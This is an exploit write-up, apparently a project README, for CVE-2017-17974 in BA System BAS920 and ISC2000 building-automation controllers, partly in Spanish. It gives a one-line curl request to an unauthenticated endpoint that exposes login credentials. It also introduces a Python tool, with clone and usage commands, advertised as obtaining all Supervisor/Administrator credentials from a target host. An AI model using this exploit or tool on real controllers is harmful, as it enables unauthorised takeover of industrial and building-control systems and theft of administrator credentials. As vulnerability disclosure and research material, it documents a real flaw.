#  Exploit; SCADAS "BAS920 & ISC2000"; Credentials Exposed
## [BA System] “Improper Access Control (Authorization)”

	[*] Exploit Title:       "SCADAS "BAS920 & ISC2000"; Credentials Exposed” 
	[*] CVE:                 CVE-2017-17974
	[*] Date:                29/12/2017
	[*] Exploit Author:      Fernandez Ezequiel ( @capitan_alfa ) && Bertin Jose ( @bertinjoseb )
	[*] Vendor:              BA System
	[*] devices(tested):     BAS920 & ISC2000

Atacando SCADAS de la firma “BA SYSTEM”: 

![BAS920](screenshot/baIexplorer.png)

Accedemos a la plataforma y como era de esperar nos recibe un "login form"

![BAS920_2](screenshot/get_passwd.png)

### Exploit:

```
	curl http://<host>/isc/get_sid_js.aspx
```

### POCs:
![BAS920_3](screenshot/POC_1.png)

![BAS920_4](screenshot/POC_2.png)

### Adentro:
![BAS920_5](screenshot/INDOOR.png)

![BAS920_6](screenshot/INDOOR_2.png)


***

# TOOL: "Plin Plan Plun"  (ex - cafeina )

## Quick start

	usr@pwn:~$ git clone https://github.com/ezelf/baCK_system.git
	usr@pwn:~$ cd baCK_system

## help
	
	usr@pwn:~/$ python plinplanplum.py --help

	python plinplanplum.py --help
	usage: plinplanplum.py [-h] [-v] --host HOST [--port PORT]

	[+] Obtaining all credentials for the Supervisor/Administrator account

	optional arguments:
	  -h, --help     show this help message and exit
	  -v, --version  show program's version number and exit
	  --host HOST    Host
	  --port PORT    Port

	[+] Demo: python plinplanplum.py --host 192.168.1.101 -p 81

***

## Usage:
![BAS920_7](screenshot/tool_passwd.png)

#### Last update !!!
![BAS920_8](screenshot/poc_tool_1.png)

***

### Reference:
 http://misteralfa-hack.blogspot.cl/2018/04/tool-plinplamplum-scadas-bas920-isc2000.html

 http://misteralfa-hack.blogspot.cl/2017/12/ba-system-improper-access-control.html